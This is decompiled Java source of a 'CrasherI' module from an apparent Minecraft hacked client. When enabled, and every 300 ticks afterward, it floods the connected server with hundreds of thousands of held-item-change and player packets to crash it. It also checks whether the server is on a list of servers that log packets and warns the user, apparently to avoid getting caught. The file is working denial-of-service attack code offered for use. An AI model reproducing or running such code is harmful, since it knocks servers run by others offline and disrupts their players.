/*
 * Decompiled with CFR 0_118.
 */
package it.nobusware.client.mods.crashers;

import QuarantineAPI.config.annotation.Handler;
import it.nobusware.client.events.EventUpdate;
import it.nobusware.client.manager.Module;
import it.nobusware.client.mods.FindPacketLog;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C09PacketHeldItemChange;

public class CrasherI extends Module {

	public CrasherI(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
		setDangerous(true);
	}

	public static boolean active;
	int loop;

	@Handler
	public void onEvent(EventUpdate event) {
		if (!this.isAbilitato()) {
			return;
		}
		++this.loop;
		if (this.loop > 300) {
			int index = 0;
			while (index < 100000) {
				mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
				mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
				mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
				++index;
			}
			this.loop = 0;
			ChatUtils.print("Sending packets...");
		}
	}

	@Override
	public void Abilitato() {
		if(FindPacketLog.packetlog.contains(mc.getCurrentServerData().serverIP)) {
			ChatUtils.print("Questo Server Packetlogga!");
			this.toggle();
		}
		active = true;
		int index = 0;
		while (index < 100000) {
			mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
			mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
			mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
			mc.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
			++index;
		}
		ChatUtils.print("Trying to crash with method I ( Items Switch )");
	}

	@Override
	public void Disabilitato() {
		active = false;
	}
}